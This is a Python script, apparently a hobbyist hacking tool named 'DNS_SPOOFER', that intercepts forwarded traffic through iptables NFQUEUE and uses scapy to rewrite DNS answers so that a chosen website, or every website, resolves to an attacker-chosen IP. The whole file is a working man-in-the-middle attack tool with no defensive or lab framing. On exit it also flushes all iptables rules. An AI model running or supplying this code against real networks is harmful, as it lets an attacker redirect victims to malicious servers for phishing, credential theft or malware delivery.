import netfilterqueue
import logging
import argparse
from colorama import Fore, Style
import os
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy

"""
HEADER
"""
# Header Header header---------------------------------------------------------------------------
print(Fore.BLUE + Style.BRIGHT + """

//  ██████╗ ███╗   ██╗███████╗        ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
//  ██╔══██╗████╗  ██║██╔════╝        ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
//  ██║  ██║██╔██╗ ██║███████╗        ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
//  ██║  ██║██║╚██╗██║╚════██║        ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
//  ██████╔╝██║ ╚████║███████║███████╗███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
//  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
//  By ------------------ Arslan                |               arslanmughal5566@protonmail.com
""" + Fore.LIGHTWHITE_EX)
# Header Header header---------------------------------------------------------------------------
"""
GLOBALS
"""
# globals globals globals---------------------------------------------------------------------------
website = '.'   #Hold website
qname = ''      #string DNSQR qname
b_qname = ''    #bytes DNSQR qname
redirect_ip = ''    #hold redirect ip

# globals globals globals---------------------------------------------------------------------------
"""
ARGS PARSER and VALIDATOR
"""
# args validator---------------------------------------------------------------------------------
parser = argparse.ArgumentParser()
parser.add_argument("-r", "--redirect-ip", dest='redirect_ip', help="IP address to which traffic need to be redirect.")
parser.add_argument("-w", "--web", dest='website', help="website to be spoofed , leave empty to spoofed all.")
args = parser.parse_args()

try:
    if args.redirect_ip:
        redirect_ip = args.redirect_ip
    else:
        redirect_ip = input(Fore.LIGHTWHITE_EX + Style.BRIGHT + "[~]" + Fore.LIGHTWHITE_EX + " Please Enter IP to which redirect : ")
    if args.website:
        website = args.website
    else:
        website = input("Please Enter website from which to redirect, \nLeave empty to redirect all traffic : ")
except KeyboardInterrupt:
    print("\n" + Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Restoring iptables...")
    os.system("iptables --flush")
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Successfully restored iptables ")
    print(Style.BRIGHT + Fore.RED + "[*]" + Fore.WHITE + Style.BRIGHT + " Exiting....")
    exit(0)
# args validator---------------------------------------------------------------------------------
"""
MANIPULATING IPTABLES
"""
# Manipulating iptables -------------------------------------------------------------------------
# Creating ip tables for intercepting QUEUE packets
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 123")
    # Run Attack Locally
    # os.system("iptables -I INPUT -j NFQUEUE --queue-num 123")
    # os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 123")
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Iptables created successfully")
except:
    print('[*] Fail to create iptables')
    print('[*] Exiting ...!')
    exit(1)
# Manipulating iptables -------------------------------------------------------------------------
"""
MAIN
"""
# MAIN----------------- -------------------------------------------------------------------------

queue = netfilterqueue.NetfilterQueue()
def capture_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    try:
        b_qname = scapy_packet[scapy.DNSQR].qname
        qname = b_qname.decode('utf-8')
    except IndexError:
        pass

    if scapy_packet.haslayer(scapy.DNSRR):
        if website in str(qname):
            print(Fore.CYAN + Style.BRIGHT + "[*]" + Fore.LIGHTWHITE_EX + Style.BRIGHT + " Redirecting " + str(qname) + " to " + redirect_ip)
            answer_packet = scapy.DNSRR(rrname=b_qname, rdata=redirect_ip)
            scapy_packet[scapy.DNS].an = answer_packet
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].chksum       # avoiding chksum error for IP Layer
            del scapy_packet[scapy.IP].len          # avoiding len error for IP Layer
            del scapy_packet[scapy.UDP].chksum      # avoiding chksum error for UDP Layer
            del scapy_packet[scapy.UDP].len     # avoiding len error for UDP Layer
            packet.set_payload(bytes(scapy_packet)) # setting altered packet
    packet.accept()
# MAIN----------------- -------------------------------------------------------------------------

"""
BINDING RUNNING AND EXITING
"""
# binding running and exiting--------------------------------------------------------------------
#Binding and running queue
queue.bind(123, capture_packet) #iptables FORWARD packet must point to NFQUEUE
try:
    queue.run()
except KeyboardInterrupt: # Avoiding keyboard interruption
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Restoring iptables...")
    os.system("iptables --flush")
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Fore.WHITE + Style.BRIGHT + " Successfully restored iptables ")
    print(Style.BRIGHT + Fore.RED + "[*]" + Fore.WHITE + Style.BRIGHT + " Exiting....")
    exit(0)
# binding running and exiting--------------------------------------------------------------------